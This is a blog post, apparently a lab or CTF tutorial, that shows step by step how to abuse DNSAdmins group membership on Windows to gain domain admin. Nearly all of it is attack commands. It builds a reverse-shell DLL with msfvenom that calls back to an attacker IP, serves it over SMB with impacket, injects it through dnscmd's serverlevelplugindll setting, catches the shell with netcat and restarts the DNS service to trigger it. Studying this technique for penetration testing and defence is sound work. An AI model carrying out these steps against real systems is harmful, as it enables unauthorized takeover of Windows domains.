---
title: Windows Privilege Escalation DNSAdmin to Domain Admin DLL Injection.
author: Udesh
date: 2020-04-08
categories: [Windows, Privilege Escalation]
tags: [Privilege Escalation]
---
This post will cover a very specific privilege escalation technique: Abusing DNSAdmin membership to gain domain admin. 

## Prepping

Checking if our user is a part of the DNSAdmins group:

type : `C:\>whoami /all`

![whoami.jpg]({{site.baseurl}}/assets/img/post/post1/1.jpg)

you can see our user in the DNSAdmins group

## Creating & serving the malicious DLL

Now we need to prepare a DLL that will be supplied as the serverlevelplugindll. so,here we are gointo use msfvenom tool. 

    $msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.X LPORT=4444 --platform=windows -f dll > ~/Desktop/plugin.dll`

Now, let’s use impacket's smbserver.py SMB server to serve this DLL. 

```shell
sudo python smbserver.py -debug SHARE /home/kali/share
```
## Injecting the DLL

Now, we are going to use dnscmd.exe to set our newly created DLL as a configfile for DNS,

```shell
C:\>dnscmd.exe BANK.local /config /serverlevelplugindll \10.10.10.X\SHARE\plugin.dll
```
Before you continue, make sure you have started you listener on the attacking machine so you are able to catch the revshell.
```shell
$nc -nvlp 4444
```
Once done, we can restart the DNS service to execute: 

```shell
$sc.exe stop dns
$sc.exe start dns
```

Now, go back and check the netcat listener, you should have a reverse shell. 😎
